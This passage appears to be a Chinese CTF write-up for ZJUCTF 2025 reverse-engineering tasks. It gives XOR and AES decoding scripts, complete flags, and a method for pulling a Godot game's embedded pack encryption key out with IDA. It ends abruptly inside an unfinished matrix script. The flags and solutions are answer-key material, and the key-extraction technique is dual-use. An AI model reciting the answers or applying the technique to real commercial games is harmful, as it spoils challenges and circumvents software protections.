<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">secret = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&quot;6d457542646b100a037f50786f452a12&quot;</span></span><br><span class="line">    <span class="string">&quot;47767f69515d34581e504f775f53151f&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;370f2001302d6b62&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">secret: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(secret[i] ^ key[i % <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = recover_flag(secret, key)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{h4ppy_hAppy_hap_:)_ovo~~}</p>
<h3 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h3><p>Part 1</p>
<ul>
<li>AST 中 <code>base64decode</code> 先用多段 <code>strcpy</code> 构造自定义字母表，再打补丁：<ul>
<li><code>var1[4]=&#39;c&#39;</code>，<code>var1[24]=&#39;g&#39;</code>，<code>var1[++var2] = &#39;0&#39;</code>（最终 <code>&#39;0&#39;</code> 插到 index 45）</li>
</ul>
</li>
<li>输入：<code>part1Code = &quot;e4oOv6wHj5W1wHNShC5=&quot;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InDe3d-</span><br></pre></td></tr></table></figure>

<p>Part 2</p>
<ul>
<li>数据：<code>part2Code = [118,871,67,10,77,821,109,6,71,825,60,79,14,861]</code></li>
<li>函数指针顺序：<code>part2funcList = &#123; cd1, cd2, cd3, cd4 &#125;</code><ul>
<li><code>cd1(x)=x^35</code>，<code>cd2(x)=x-776</code>，<code>cd3(x)=67</code>（恒 <code>&#39;C&#39;</code>），<code>cd4(x)=x+42</code></li>
</ul>
</li>
<li>规则：<code>out[i] = funcs[i%4](part2Code[i]) &amp; 0xff</code></li>
<li>最后强制修补：<code>out[6]=&#39;m&#39;</code>, <code>out[10]=&#39;f&#39;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U_C4n-m0d1fy-U</span><br></pre></td></tr></table></figure>

<p>Part 3 </p>
<ul>
<li>密文：<code>e3d08f470b061df1cca94eb68adaffb011f1f19f26770496494033f497302ffe</code></li>
<li>Key：<code>AES_secret_key = &quot;ZJUCTF&#123;flag_is_here_just_kidding&#125;&quot;[:32]</code></li>
<li>IV：<code>AES_iv = &quot;This is a RC2 IV&quot;[:16]</code></li>
<li>模式：AES-256-CBC，解密去 PKCS#7</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R_PoC-int0_s0me7hinG-byp4s</span><br></pre></td></tr></table></figure>

<p>Part 5</p>
<ul>
<li>对 <code>Part5Code</code>：逐字节 <code>^ 0x98</code> → <code>gzip</code> 解压</li>
<li>取偏移 6 起，每 +133 取一个，共 16 个字节，末尾补 <code>\0</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5ing-PTA&#x27;s_c0de-</span><br></pre></td></tr></table></figure>

<p>Part 6</p>
<ul>
<li>对 <code>Part6Code</code>：逐字节 <code>^ 0x98</code> → <code>gzip</code> 解压 → memfd + fexecve 执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pl4gi4r1sm-ch3ck&#125;</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{InDe3d-U_C4n-m0d1fy-UR_PoC-int0_s0me7hinG-byp4s5ing-PTA’s_c0de-pl4gi4r1sm-ch3ck}</p>
<h3 id="Min-re-ctf-Godot-Edition"><a href="#Min-re-ctf-Godot-Edition" class="headerlink" title="Min(re)ctf Godot Edition"></a>Min(re)ctf Godot Edition</h3><p>对照godot源码，搜索encryption_key，发现try_open_pack函数，这个在IDA strings里面可以搜到，追踪一下，在这个try_open_pack附近位置发现一个off_143AC7980   dq offset aH4lf，跟过去看到如下内容<br><img src="/2025/11/17/zjuctf2025/3.png" alt="alt text"></p>
<p>继续追踪aH4lf，发现这个地方<br><img src="/2025/11/17/zjuctf2025/4.png" alt="alt text"></p>
<p>分析一下发现是做了异或，还原逻辑后即可求出key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">key1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;68346C6600746833006B3379007C30306B006D307233006361723366766C6C79&quot;</span>)</span><br><span class="line">key2 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;8FD9592ABAE736805F0CC8AD439A26D37A63914EE92CA75B13CD4C843ABD6FF0&quot;</span>)</span><br><span class="line">xorr = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;6E0F9CA57A2B88214607345DD2A3A059&#x27;</span>) + key2[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(strxor(key1, xorr).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>最终拿到密钥是063bf0c37a5fe012466c0724d2df90691163fc7e9b1fa73872bf7fe24cd10389，在GDRE tools中设置好即可处理ZJUZTF.exe</p>
<p>flag_decrypter.gd中找到解密逻辑，game.tscn的flag_holder节点下面所有Label的text字段中找到密文</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">mod = <span class="number">251</span></span><br><span class="line"></span><br><span class="line">mat = [[<span class="number">240</span>,<span class="number">137</span>,<span class="number">28</span>,<span class="number">247</span>,<span class="number">167</span>,<span class="number">122</span>,<span class="number">122</span>,<span class="number">237</span>,<span class="number">159</span>,<span class="number">197</span>,<span class="number">20</span>,<span class="number">143</span>,<span class="number">225</span>,<span class="number">112</span>,<span class="number">177</span>,<span class="number">19</span>,<span class="number">31</span>,<span class="number">129</span>,<span class="number">119</span>,<span class="number">182</span>,<span class="number">78</span>,<span class="number">74</span>,<span class="number">69</span>,<span class="number">7</span>,<span class="number">48</span>,<span class="number">181</span>,<span class="number">33</span>,<span class="number">178</span>,<span class="number">24</span>,<span class="number">245</span>,<span class="number">49</span>,<span class="number">229</span>,],</span><br><span class="line">[<span class="number">43</span>,<span class="number">196</span>,<span class="number">183</span>,<span class="number">207</span>,<span class="number">193</span>,<span class="number">240</span>,<span class="number">191</span>,<span class="number">224</span>,<span class="number">20</span>,<span class="number">107</span>,<span class="number">67</span>,<span class="number">81</span>,<span class="number">42</span>,<span class="number">100</span>,<span class="number">234</span>,<span class="number">202</span>,<span class="number">119</span>,<span class="number">106</span>,<span class="number">132</span>,<span class="number">180</span>,<span class="number">48</span>,<span class="number">100</span>,<span class="number">166</span>,<span class="number">186</span>,<span class="number">219</span>,<span class="number">123</span>,<span class="number">75</span>,<span class="number">242</span>,<span class="number">41</span>,<span class="number">210</span>,<span class="number">142</span>,<span class="number">199</span>,],</span><br><span class="line">[<span class="number">102</span>,<span class="number">87</span>,<span class="number">229</span>,<span class="number">104</span>,<span class="number">237</span>,<span class="number">113</span>,<span class="number">177</span>,<span class="number">58</span>,<span class="number">10</span>,<span class="number">63</span>,<span class="number">56</span>,<span class="number">161</span>,<span class="number">199</span>,<span class="number">224</span>,<span class="number">95</span>,<span class="number">1</span>,<span class="number">172</span>,<span class="number">231</span>,<span class="number">146</span>,<span class="number">84</span>,<span class="number">76</span>,<span class="number">227</span>,<span class="number">153</span>,<span class="number">44</span>,<span class="number">31</span>,<span class="number">174</span>,<span class="number">71</span>,<span class="number">9</span>,<span class="number">249</span>,<span class="number">25</span>,<span class="number">54</span>,<span class="number">144</span>,],</span><br><span class="line">[<span class="number">208</span>,<span class="number">172</span>,<span class="number">41</span>,<span class="number">180</span>,<span class="number">172</span>,<span class="number">65</span>,<span class="number">123</span>,<span class="number">17</span>,<span class="number">24</span>,<span class="number">78</span>,<span class="number">34</span>,<span class="number">235</span>,<span class="number">98</span>,<span class="number">202</span>,<span class="number">146</span>,<span class="number">134</span>,<span class="number">136</span>,<span class="number">69</span>,<span class="number">107</span>,<span class="number">15</span>,<span class="number">135</span>,<span class="number">68</span>,<span class="number">193</span>,<span class="number">107</span>,<span class="number">53</span>,<span class="number">172</span>,<span class="number">9</span>,<span class="number">106</span>,<span class="number">154</span>,<span class="number">112</span>,<span class="number">180</span>,<span class="number">233</span>,],</span><br><span class="line">[<span class="number">202</span>,<span class="number">118</span>,<span class="number">185</span>,<span class="number">191</span>,<span class="number">139</span>,<span class="number">40</span>,<span class="number">19</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">96</span>,<span class="number">201</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">146</span>,<span class="number">142</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">7</span>,<span class="number">230</span>,<span class="number">232</span>,<span class="number">247</span>,<span class="number">164</span>,<span class="number">65</span>,<span class="number">57</span>,<span class="number">141</span>,<span class="number">143</span>,<span class="number">142</span>,<span class="number">54</span>,<span class="number">91</span>,<span class="number">208</span>,<span class="number">15</span>,<span class="number">134</span>,],</span><br><span class="line">[<span class="number">203</span>,<span class="number">129</span>,<span class="number">32</span>,<span class="number">93</span>,<span class="number">88</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">21</span>,<span class="number">73</span>,<span class="number">26</span>,<span class="number">67</span>,<span class="number">160</span>,<span class="number">152</span>,<span class="number">171</span>,<span class="number">1</span>,<span class="number">182</span>,<span class="number">200</span>,<span class="number">175</span>,<span class="number">223</span>,<span class="number">220</span>,<span class="number">216</span>,<span class="number">143</span>,<span class="number">140</span>,<span class="number">139</span>,<span class="number">17</span>,<span class="number">141</span>,<span class="number">31</span>,<span class="number">7</span>,<span class="number">222</span>,<span class="number">123</span>,<span class="number">62</span>,<span class="number">181</span>,],</span><br><span class="line">[<span class="number">167</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">75</span>,<span class="number">170</span>,<span class="number">116</span>,<span class="number">47</span>,<span class="number">175</span>,<span class="number">81</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">100</span>,<span class="number">85</span>,<span class="number">199</span>,<span class="number">234</span>,<span class="number">241</span>,<span class="number">194</span>,<span class="number">58</span>,<span class="number">203</span>,<span class="number">235</span>,<span class="number">51</span>,<span class="number">109</span>,<span class="number">10</span>,<span class="number">65</span>,<span class="number">249</span>,<span class="number">56</span>,<span class="number">208</span>,<span class="number">68</span>,<span class="number">78</span>,<span class="number">74</span>,<span class="number">169</span>,<span class="number">236</span>,],</span><br><span class="line">[<span class="number">176</span>,<span class="number">11</span>,<span class="number">56</span>,<span class="number">18</span>,<span class="number">79</span>,<span class="number">154</span>,<span class="number">193</span>,<span class="number">29</span>,<span class="number">44</span>,<span class="number">202</span>,<span class="number">127</span>,<span class="number">44</span>,<span class="number">128</span>,<span class="number">178</span>,<span class="number">77</span>,<span class="number">92</span>,<span class="number">74</span>,<span class="number">162</span>,<span class="number">143</span>,<span class="number">39</span>,<span class="number">104</span>,<span class="number">228</span>,<span class="number">239</span>,<span class="number">215</span>,<span class="number">171</span>,<span class="number">190</span>,<span class="number">46</span>,<span class="number">226</span>,<span class="number">54</span>,<span class="number">239</span>,<span class="number">185</span>,<span class="number">205</span>,],</span><br><span class="line">[<span class="number">42</span>,<span class="number">162</span>,<span class="number">135</span>,<span class="number">132</span>,<span class="number">69</span>,<span class="number">157</span>,<span class="number">148</span>,<span class="number">153</span>,<span class="number">187</span>,<span class="number">0</span>,<span class="number">208</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">238</span>,<span class="number">156</span>,<span class="number">48</span>,<span class="number">155</span>,<span class="number">239</span>,<span class="number">89</span>,<span class="number">11</span>,<span class="number">63</span>,<span class="number">54</span>,<span class="number">193</span>,<span class="number">118</span>,<span class="number">26</span>,<span class="number">192</span>,<span class="number">122</span>,<span class="number">120</span>,<span class="number">156</span>,<span class="number">47</span>,<span class="number">214</span>,<span class="number">240</span>,],</span><br><span class="line">[<span class="number">3</span>,<span class="number">245</span>,<span class="number">65</span>,<span class="number">62</span>,<span class="number">179</span>,<span class="number">127</span>,<span class="number">123</span>,<span class="number">76</span>,<span class="number">12</span>,<span class="number">145</span>,<span class="number">45</span>,<span class="number">165</span>,<span class="number">219</span>,<span class="number">35</span>,<span class="number">115</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">136</span>,<span class="number">210</span>,<span class="number">193</span>,<span class="number">207</span>,<span class="number">41</span>,<span class="number">74</span>,<span class="number">154</span>,<span class="number">106</span>,<span class="number">110</span>,<span class="number">162</span>,<span class="number">54</span>,<span class="number">201</span>,<span class="number">115</span>,<span class="number">86</span>,<span class="number">100</span>,],</span><br><span class="line">[<span class="number">200</span>,<span class="number">75</span>,<span class="number">67</span>,<span class="number">194</span>,<span class="number">94</span>,<span class="number">114</span>,<span class="number">163</span>,<span class="number">108</span>,<span class="number">68</span>,<span class="number">246</span>,<span class="number">1</span>,<span class="number">168</span>,<span class="number">212</span>,<span class="number">23</span>,<span class="number">131</span>,<span class="number">199</span>,<span class="number">84</span>,<span class="number">160</span>,<span class="number">199</span>,<span class="number">196</span>,<span class="number">11</span>,<span class="number">190</span>,<span class="number">106</span>,<span class="number">198</span>,<span class="number">193</span>,<span class="number">241</span>,<span class="number">170</span>,<span class="number">187</span>,<span class="number">26</span>,<span class="number">13</span>,<span class="number">129</span>,<span class="number">236</span>,],</span><br><span class="line">[<span class="number">75</span>,<span class="number">54</span>,<span class="number">63</span>,<span class="number">37</span>,<span class="number">188</span>,<span class="number">143</span>,<span class="number">180</span>,<span class="number">144</span>,<span class="number">111</span>,<span class="number">0</span>,<span class="number">242</span>,<span class="number">7</span>,<span class="number">248</span>,<span class="number">159</span>,<span class="number">81</span>,<span class="number">77</span>,<span class="number">12</span>,<span class="number">221</span>,<span class="number">45</span>,<span class="number">129</span>,<span class="number">186</span>,<span class="number">105</span>,<span class="number">140</span>,<span class="number">223</span>,<span class="number">86</span>,<span class="number">217</span>,<span class="number">16</span>,<span class="number">197</span>,<span class="number">228</span>,<span class="number">190</span>,<span class="number">13</span>,<span class="number">142</span>,],</span><br><span class="line">[<span class="number">89</span>,<span class="number">17</span>,<span class="number">25</span>,<span class="number">162</span>,<span class="number">180</span>,<span class="number">110</span>,<span class="number">36</span>,<span class="number">99</span>,<span class="number">161</span>,<span class="number">99</span>,<span class="number">22</span>,<span class="number">198</span>,<span class="number">97</span>,<span class="number">18</span>,<span class="number">149</span>,<span class="number">16</span>,<span class="number">211</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">119</span>,<span class="number">73</span>,<span class="number">146</span>,<span class="number">17</span>,<span class="number">249</span>,<span class="number">187</span>,<span class="number">56</span>,<span class="number">99</span>,<span class="number">222</span>,<span class="number">237</span>,<span class="number">143</span>,<span class="number">143</span>,<span class="number">85</span>,],</span><br><span class="line">[<span class="number">180</span>,<span class="number">209</span>,<span class="number">165</span>,<span class="number">76</span>,<span class="number">56</span>,<span class="number">50</span>,<span class="number">79</span>,<span class="number">1</span>,<span class="number">71</span>,<span class="number">232</span>,<span class="number">100</span>,<span class="number">131</span>,<span class="number">212</span>,<span class="number">49</span>,<span class="number">146</span>,<span class="number">8</span>,<span class="number">235</span>,<span class="number">154</span>,<span class="number">17</span>,<span class="number">199</span>,<span class="number">19</span>,<span class="number">244</span>,<span class="number">204</span>,<span class="number">6</span>,<span class="number">149</span>,<span class="number">65</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">1</span>,<span class="number">216</span>,<span class="number">70</span>,<span class="number">184</span>,],</span><br><span class="line">[<span class="number">129</span>,<span class="number">62</span>,<span class="number">177</span>,<span class="number">224</span>,<span class="number">130</span>,<span class="number">244</span>,<span class="number">152</span>,<span class="number">97</span>,<span class="number">22</span>,<span class="number">109</span>,<span class="number">83</span>,<span class="number">119</span>,<span class="number">99</span>,<span class="number">212</span>,<span class="number">140</span>,<span class="number">241</span>,<span class="number">195</span>,<span class="number">27</span>,<span class="number">221</span>,<span class="number">168</span>,<span class="number">119</span>,<span class="number">196</span>,<span class="number">160</span>,<span class="number">18</span>,<span class="number">74</span>,<span class="number">43</span>,<span class="number">216</span>,<span class="number">237</span>,<span class="number">81</span>,<span class="number">55</span>,<span class="number">15</span>,<span class="number">128</span>,],</span><br><span class="line">[<span class="number">11</span>,<span class="number">181</span>,<span class="number">40</span>,<span class="number">232</span>,<span class="number">233</span>,<span class="number">114</span>,<span class="number">35</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">0</span>,<span class="number">217</span>,<span class="number">1</span>,<span class="number">224</span>,<span class="number">22</span>,<span class="number">223</span>,<span class="number">225</span>,<span class="number">162</span>,<span class="number">126</span>,<span class="number">155</span>,<span class="number">11</span>,<span class="number">105</span>,<span class="number">9</span>,<span class="number">234</span>,<span class="number">11</span>,<span class="number">46</span>,<span class="number">87</span>,<span class="number">149</span>,<span class="number">71</span>,<span class="number">193</span>,<span class="number">212</span>,<span class="number">48</span>,<span class="number">59</span>,],</span><br><span class="line">[<span class="number">54</span>,<span class="number">151</span>,<span class="number">54</span>,<span class="number">67</span>,<span class="number">167</span>,<span class="number">86</span>,<span class="number">34</span>,<span class="number">96</span>,<span class="number">186</span>,<span class="number">237</span>,<span class="number">137</span>,<span class="number">2</span>,<span class="number">120</span>,<span class="number">203</span>,<span class="number">188</span>,<span class="number">174</span>,<span class="number">39</span>,<span class="number">67</span>,<span class="number">181</span>,<span class="number">234</span>,<span class="number">89</span>,<span class="number">5</span>,<span class="number">192</span>,<span class="number">5</span>,<span class="number">157</span>,<span class="number">58</span>,<span class="number">111</span>,<span class="number">63</span>,<span class="number">154</span>,<span class="number">137</span>,<span class="number">249</span>,<span class="number">89</span>,],</span><br><span class="line">[<span class="number">17</span>,<span class="number">159</span>,<span class="number">229</span>,<span class="number">58</span>,<span class="number">9</span>,<span class="number">70</span>,<span class="number">107</span>,<span class="number">227</span>,<span class="number">11</span>,<span class="number">130</span>,<span class="number">107</span>,<span class="number">197</span>,<span class="number">200</span>,<span class="number">146</span>,<span class="number">114</span>,<span class="number">48</span>,<span class="number">26</span>,<span class="number">49</span>,<span class="number">1</span>,<span class="number">40</span>,<span class="number">182</span>,<span class="number">35</span>,<span class="number">213</span>,<span class="number">151</span>,<span class="number">95</span>,<span class="number">39</span>,<span class="number">58</span>,<span class="number">78</span>,<span class="number">209</span>,<span class="number">134</span>,<span class="number">73</span>,<span class="number">42</span>,],</span><br><span class="line">[<span class="number">14</span>,<span class="number">48</span>,<span class="number">75</span>,<span class="number">250</span>,<span class="number">237</span>,<span class="number">15</span>,<span class="number">235</span>,<span class="number">212</span>,<span class="number">29</span>,<span class="number">137</span>,<span class="number">84</span>,<span class="number">111</span>,<span class="number">126</span>,<span class="number">20</span>,<span class="number">129</span>,<span class="number">159</span>,<span class="number">26</span>,<span class="number">96</span>,<span class="number">63</span>,<span class="number">168</span>,<span class="number">126</span>,<span class="number">15</span>,<span class="number">212</span>,<span class="number">177</span>,<span class="number">109</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">15</span>,<span class="number">182</span>,<span class="number">139</span>,<span class="number">144</span>,<span class="number">146</span>,],</span><br><span class="line">[<span class="number">20</span>,<span class="number">97</span>,<span class="number">236</span>,<span class="number">202</span>,<span class="number">236</span>,<span class="number">86</span>,<span class="number">53</span>,<span class="number">246</span>,<span class="number">180</span>,<span class="number">137</span>,<span class="number">65</span>,<span class="number">80</span>,<span class="number">243</span>,<span class="number">182</span>,<span class="number">86</span>,<span class="number">37</span>,<span class="number">195</span>,<span class="number">141</span>,<span class="number">192</span>,<span class="number">234</span>,<span class="number">25</span>,<span class="number">133</span>,<span class="number">51</span>,<span class="number">163</span>,<span class="number">180</span>,<span class="number">54</span>,<span class="number">22</span>,<span class="number">77</span>,<span class="number">103</span>,<span class="number">163</span>,<span class="number">35</span>,<span class="number">124</span>,],</span><br><span class="line">[<span class="number">193</span>,<span class="number">155</span>,<span class="number">7</span>,<span class="number">245</span>,<span class="number">27</span>,<span class="number">7</span>,<span class="number">35</span>,<span class="number">3</span>,<span class="number">77</span>,<span class="number">0</span>,<span class="number">146</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">35</span>,<span class="number">50</span>,<span class="number">119</span>,<span class="number">120</span>,<span class="number">217</span>,<span class="number">53</span>,<span class="number">70</span>,<span class="number">174</span>,<span class="number">208</span>,<span class="number">156</span>,<span class="number">121</span>,<span class="number">178</span>,<span class="number">38</span>,<span class="number">218</span>,<span class="number">76</span>,<span class="number">19</span>,<span class="number">5</span>,<span class="number">96</span>,<span class="number">232</span>,],</span><br><span class="line">[<span class="number">67</span>,<span class="number">85</span>,<span class="number">156</span>,<span class="number">235</span>,<span class="number">12</span>,<span class="number">166</span>,<span class="number">237</span>,<span class="number">165</span>,<span class="number">195</span>,<span class="number">22</span>,<span class="number">144</span>,<span class="number">89</span>,<span class="number">174</span>,<span class="number">161</span>,<span class="number">185</span>,<span class="number">175</span>,<span class="number">214</span>,<span class="number">200</span>,<span class="number">19</span>,<span class="number">93</span>,<span class="number">134</span>,<span class="number">45</span>,<span class="number">83</span>,<span class="number">150</span>,<span class="number">249</span>,<span class="number">229</span>,<span class="number">95</span>,<span class="number">140</span>,<span class="number">249</span>,<span class="number">128</span>,<span class="number">26</span>,<span class="number">53</span>,],</span><br><span class="line">[<span class="number">173</span>,<span class="number">125</span>,<span class="number">125</span>,<span class="number">169</span>,<span class="number">77</span>,<span class="number">102</span>,<span class="number">240</span>,<span class="number">92</span>,<span class="number">114</span>,<span class="number">212</span>,<span class="number">92</span>,<span class="number">215</span>,<span class="number">134</span>,<span class="number">66</span>,<span class="number">227</span>,<span class="number">84</span>,<span class="number">107</span>,<span class="number">140</span>,<span class="number">168</span>,<span class="number">32</span>,<span class="number">221</span>,<span class="number">240</span>,<span class="number">221</span>,<span class="number">186</span>,<span class="number">165</span>,<span class="number">179</span>,<span class="number">65</span>,<span class="number">172</span>,<span class="number">34</span>,<span class="number">37</span>,<span class="number">200</span>,<span class="number">204</span>,],</span><br><span class="line">[<span class="number">122</span>,<span class="number">224</span>,<span class="number">183</span>,<span class="number">187</span>,<span class="number">234</span>,<span class="number">97</span>,<span class="number">192</span>,<span class="number">65</span>,<span class="number">219</span>,<span class="number">138</span>,<span class="number">206</span>,<span class="number">240</span>,<span class="number">247</span>,<span class="number">73</span>,<span class="number">73</span>,<span class="number">65</span>,<span class="number">241</span>,<span class="number">63</span>,<span class="number">191</span>,<span class="number">183</span>,<span class="number">228</span>,<span class="number">90</span>,<span class="number">80</span>,<span class="number">169</span>,<span class="number">32</span>,<span class="number">182</span>,<span class="number">186</span>,<span class="number">99</span>,<span class="number">192</span>,<span class="number">36</span>,<span class="number">168</span>,<span class="number">173</span>,],</span><br><span class="line">[<span class="number">112</span>,<span class="number">86</span>,<span class="number">120</span>,<span class="number">236</span>,<span class="number">226</span>,<span class="number">43</span>,<span class="number">56</span>,<span class="number">19</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">250</span>,<span class="number">68</span>,<span class="number">25</span>,<span class="number">88</span>,<span class="number">74</span>,<span class="number">38</span>,<span class="number">148</span>,<span class="number">194</span>,<span class="number">14</span>,<span class="number">174</span>,<span class="number">236</span>,<span class="number">200</span>,<span class="number">125</span>,<span class="number">76</span>,<span class="number">31</span>,<span class="number">122</span>,<span class="number">150</span>,<span class="number">40</span>,<span class="number">4</span>,<span class="number">53</span>,<span class="number">216</span>,<span class="number">68</span>,],</span><br><span class="line">[<span class="number">18</span>,<span class="number">173</span>,<span class="number">207</span>,<span class="number">161</span>,<span class="number">146</span>,<span class="number">78</span>,<span class="number">119</span>,<span class="number">245</span>,<span class="number">238</span>,<span class="number">98</span>,<span class="number">160</span>,<span class="number">221</span>,<span class="number">138</span>,<span class="number">227</span>,<span class="number">154</span>,<span class="number">173</span>,<span class="number">100</span>,<span class="number">93</span>,<span class="number">38</span>,<span class="number">45</span>,<span class="number">77</span>,<span class="number">245</span>,<span class="number">158</span>,<span class="number">221</span>,<span class="number">217</span>,<span class="number">206</span>,<span class="number">214</span>,<span class="number">13</span>,<span class="number">205</span>,<span class="number">165</span>,<span class="number">21</span>,<span class="number">170</span>,],</span><br><span class="line">[<span class="number">139</span>,<span class="number">36</span>,<span class="number">18</span>,<span class="number">80</span>,<span class="number">148</span>,<span class="number">109</span>,<span class="number">14</span>,<span class="number">74</span>,<span class="number">198</span>,<span class="number">103</span>,<span class="number">135</span>,<span class="number">16</span>,<span class="number">103</span>,<span class="number">121</span>,<span class="number">107</span>,<span class="number">185</span>,<span class="number">23</span>,<span class="number">107</span>,<span class="number">186</span>,<span class="number">110</span>,<span class="number">58</span>,<span class="number">124</span>,<span class="number">93</span>,<span class="number">247</span>,<span class="number">84</span>,<span class="number">149</span>,<span class="number">237</span>,<span class="number">211</span>,<span class="number">135</span>,<span class="number">163</span>,<span class="number">8</span>,<span class="number">169</span>,],</span><br><span class="line">[<span class="number">248</span>,<span class="number">5</span>,<span class="number">140</span>,<span class="number">217</span>,<span class="number">185</span>,<span class="number">44</span>,<span class="number">10</span>,<span class="number">232</span>,<span class="number">191</span>,<span class="number">215</span>,<span class="number">237</span>,<span class="number">139</span>,<span class="number">230</span>,<span class="number">46</span>,<span class="number">129</span>,<span class="number">67</span>,<span class="number">246</span>,<span class="number">211</span>,<span class="number">33</span>,<span class="number">157</span>,<span class="number">70</span>,<span class="number">127</span>,<span class="number">220</span>,<span class="number">26</span>,<span class="number">178</span>,<span class="number">41</span>,<span class="number">133</span>,<span class="number">123</span>,<span class="number">193</span>,<span class="number">231</span>,<span class="number">90</span>,<span class="number">90</span>,],</span><br><span class="line">[<span class="number">81</span>,<span class="number">224</span>,<span class="number">139</span>,<span class="number">121</span>,<span class="number">88</span>,<span class="number">233</span>,<span class="number">98</span>,<span class="number">23</span>,<span class="number">57</span>,<span class="number">29</span>,<span class="number">37</span>,<span class="number">248</span>,<span class="number">220</span>,<span class="number">171</span>,<span class="number">149</span>,<span class="number">110</span>,<span class="number">229</span>,<span class="number">193</span>,<span class="number">215</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">169</span>,<span class="number">22</span>,<span class="number">120</span>,<span class="number">91</span>,<span class="number">175</span>,<span class="number">145</span>,<span class="number">125</span>,<span class="number">224</span>,<span class="number">190</span>,<span class="number">206</span>,<span class="number">1</span>,],</span><br><span class="line">[<span class="number">71</span>,<span class="number">119</span>,<span class="number">177</span>,<span class="number">107</span>,<span class="number">162</span>,<span class="number">7</span>,<span class="number">213</span>,<span class="number">33</span>,<span class="number">79</span>,<span class="number">0</span>,<span class="number">210</span>,<span class="number">156</span>,<span class="number">193</span>,<span class="number">52</span>,<span class="number">68</span>,<span class="number">123</span>,<span class="number">108</span>,<span class="number">212</span>,<span class="number">222</span>,<span class="number">135</span>,<span class="number">119</span>,<span class="number">21</span>,<span class="number">71</span>,<span class="number">126</span>,<span class="number">201</span>,<span class="number">189</span>,<span class="number">74</span>,<span class="number">115</span>,<span class="number">232</span>,<span class="number">224</span>,<span class="number">185</span>,<span class="number">92</span>,],</span><br><span class="line">[<span class="number">248</span>,<span class="number">36</span>,<span class="number">157</span>,<span class="number">41</span>,<span class="number">85</span>,<span class="number">22</span>,<span class="number">193</span>,<span class="number">111</span>,<span class="number">96</span>,<span class="number">166</span>,<span 